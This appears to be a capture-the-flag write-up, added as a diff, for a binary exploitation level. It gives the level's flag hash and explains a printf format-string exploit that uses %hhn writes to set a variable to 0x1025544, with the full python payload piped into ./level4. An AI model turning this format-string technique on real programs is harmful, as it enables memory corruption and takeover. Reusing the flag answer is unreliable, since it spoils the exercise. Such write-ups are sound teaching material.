@@ -1,0 +1,32 @@
+flag: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+This exercise is very similar to the first one, the only difference being that the number we have to set on the variable is a very big one: 0x1025544
+We can break it down in 4-bytes format:
+
+0x1025544
+=> 0x1 0x02 0x55 0x44
+=> 1   2    85   68
+
+The goal there is to set each byte of the 4-byte zone following the address of m.
+To do so, we will use the %hhn flag of printf and begin our payload by printing each address we want to write.
+
+Right after, as we are working one byte at the time, we will reset our counter by overflowing it, following this simple rule: padding=256-value. This is not necessary, but it is clearer.
+
+Our payload looks like this:
+python -c 'print \
+	"\x10\x98\x04\x08" \	# The beginning of the addresses
+  + "\x11\x98\x04\x08" \
+  + "\x12\x98\x04\x08" \
+  + "\x13\x98\x04\x08" \
+	+ "%240c" \				# Overflow to reset the counter
+	+ "%1c%15$hhn" \		# Writing 1 to the last address
+	+ "%255c" \				# etc
+	+ "%2c%14$hhn" \
+	+ "%254c" \
+	+ "%85c%13$hhn" \
+	+ "%171c" \
+	+ "%68c%12$hhn"'
+
+Note that the addresses are decreasing because we work in little endian, but I find it cleaner to write it in this order.
+
+python -c 'print "\x10\x98\x04\x08" + "\x11\x98\x04\x08" + "\x12\x98\x04\x08" + "\x13\x98\x04\x08" + "%240c" + "%1c%15$hhn" + "%255c" + "%2c%14$hhn" + "%254c" + "%85c%13$hhn" + "%171c" + "%68c%12$hhn"' | ./level4
